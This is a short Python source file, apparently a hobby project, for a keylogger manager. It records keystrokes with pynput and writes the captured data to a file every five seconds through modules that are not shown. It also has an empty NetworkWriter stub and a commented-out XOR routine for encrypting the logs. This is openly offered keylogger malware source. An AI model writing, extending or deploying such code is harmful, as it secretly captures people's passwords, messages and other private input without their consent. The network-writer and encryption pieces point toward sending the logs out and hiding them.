import time
from pynput import keyboard
from datetime import datetime
import pygetwindow as gw
from abc import ABC, abstractmethod
import json
from keyLoggerservice import KeyLoggerService
from write import FileWriter



class NetworkWriter():
    pass
# class Enctyptor:
#     def __init__(self):
#         self.encrypted_key=10101010
#     def encrypt(self, string):
#         resulet=[]
#         for leter in string:
#             resulet.append(ord(leter)^self.encrypted_key)
#         return resulet
#     def xor(self,data):
#         encrypted_data={}
#         for window in data:
#             new_window=self.encrypt(window)
#             encrypted_data[new_window]={}
#             for time in data[window]:
#                 new_time=self.encrypt(time)
#                 encrypted_data[new_window][new_time]=self.encrypt(data[window][time])
#         return encrypted_data

class KeyLoggerManager:

    def __init__(self):
        self.service = KeyLoggerService()
        self.writer = FileWriter()
        # self.encryptor = Enctyptor()
        self.listener = keyboard.Listener(
            on_press=self.service.get_keyword
        )

    def start(self):
        self.listener.start()
        print("Keylogger is starting! Press ctrl+c to stop!")
        while True:
            time.sleep(5)
            self.writer.write(self.service.get_data())

if __name__ == "__main__":
    manager = KeyLoggerManager()
    manager.start()